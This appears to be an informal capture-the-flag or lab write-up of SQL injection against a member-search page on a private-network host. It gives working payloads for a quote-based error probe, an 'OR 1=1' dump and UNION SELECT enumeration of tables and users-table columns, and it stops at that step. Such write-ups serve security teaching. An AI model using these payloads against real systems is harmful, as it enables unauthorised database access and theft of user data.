
in page : http://10.12.100.105/?page=member 

you will find an input field to search for a member by ID

you can retrieve the member details by intering a number in the input field

one of the ways to detect SQL injection is to submit a quote
```
 ' 
``` 
submiting this quote will return this error 
```You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1 
```
with that output you can be cofident that this is a vulnerable payload
you can also try inputs like 
```OR 1=1 to retrive the whole list of membert
notice using this or we get a user named flag with surname GetThe
```

next, we want to retrieve all the tables, we can do that using this query :

```1 union SELECT null, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
```

note: in order for union to succseed we need two conditions :

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

getting the output of all the talbles, notice a users table, thats our baby

we send another query to the database to get all the column names for the users table

```1 union SELECT null , COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = CHAR(0x75, 0x73, 0x65, 0x72, 0x73)
```


